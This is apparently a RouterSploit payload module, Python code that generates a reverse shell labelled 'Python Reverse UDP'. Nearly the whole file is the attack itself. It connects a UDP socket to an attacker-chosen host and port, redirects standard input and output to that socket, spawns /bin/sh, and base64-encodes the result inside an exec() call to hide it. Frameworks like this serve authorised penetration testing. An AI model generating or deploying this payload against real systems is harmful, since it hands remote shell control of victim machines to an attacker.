from base64 import b64encode
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Exploit(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Reverse UDP",
        "description": "Creates interactive udp reverse shell by using python.",
        "authors": (
            "Andre Marques (zc00l)",  # shellpop
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "import os\n" +
            "import pty\n" +
            "import socket\n" +
            "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n" +
            "s.connect(('{}',{}))\n".format(self.lhost, self.lport) +
            "os.dup2(s.fileno(), 0)\n" +
            "os.dup2(s.fileno(), 1)\n" +
            "os.dup2(s.fileno(), 2)\n" +
            "pty.spawn('/bin/sh');\n" +
            "s.close()\n"
        )

        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
        return "exec('{}'.decode('base64'))".format(encoded_payload)
